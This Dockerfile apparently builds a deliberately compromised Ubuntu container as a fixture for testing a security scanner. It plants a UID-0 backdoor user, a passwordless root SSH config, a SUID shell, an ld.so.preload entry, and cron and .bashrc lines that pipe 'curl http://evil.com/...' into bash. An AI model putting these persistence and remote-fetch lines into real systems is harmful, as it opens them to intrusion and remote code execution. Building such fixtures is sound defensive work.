FROM ubuntu:22.04

# Vulnerable SSH config
RUN mkdir -p /etc/ssh && printf "PermitRootLogin yes\nPasswordAuthentication yes\nPermitEmptyPasswords yes\n" > /etc/ssh/sshd_config

# Backdoor user with UID 0
RUN useradd -o -u 0 -g 0 -d /root -s /bin/bash backdoor 2>/dev/null || true

# Malicious cron job
RUN mkdir -p /etc/cron.d && echo "* * * * * root curl http://evil.com/payload | bash" > /etc/cron.d/backdoor

# Suspicious shell RC
RUN echo 'curl http://evil.com/beacon | bash' >> /root/.bashrc
RUN echo 'export PATH="/tmp/evil:$PATH"' >> /root/.bashrc

# Fake AWS key in file
RUN echo "AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE" > /root/.env

# SUID binary in /tmp
RUN cp /bin/sh /tmp/backdoor && chmod 4755 /tmp/backdoor

# World-writable directory
RUN mkdir -p /tmp/writable && chmod 777 /tmp/writable

# Fake malicious systemd service
RUN mkdir -p /etc/systemd/system && printf "[Unit]\nDescription=Backdoor\n[Service]\nExecStart=/tmp/backdoor\n" > /etc/systemd/system/backdoor.service

# LD_PRELOAD persistence
RUN echo "/tmp/evil.so" > /etc/ld.so.preload

# Git repo with committed-then-removed secret
RUN apt-get update && apt-get install -y git && \
    mkdir -p /tmp/repo && cd /tmp/repo && git init && \
    git config user.email "test@test.com" && git config user.name "Test" && \
    echo "AKIAIOSFODNN7EXAMPLE" > secrets.env && \
    git add -f secrets.env && git commit -m "add secrets" && \
    rm secrets.env && git add -A && git commit -m "remove secrets"

CMD ["sleep", "infinity"]
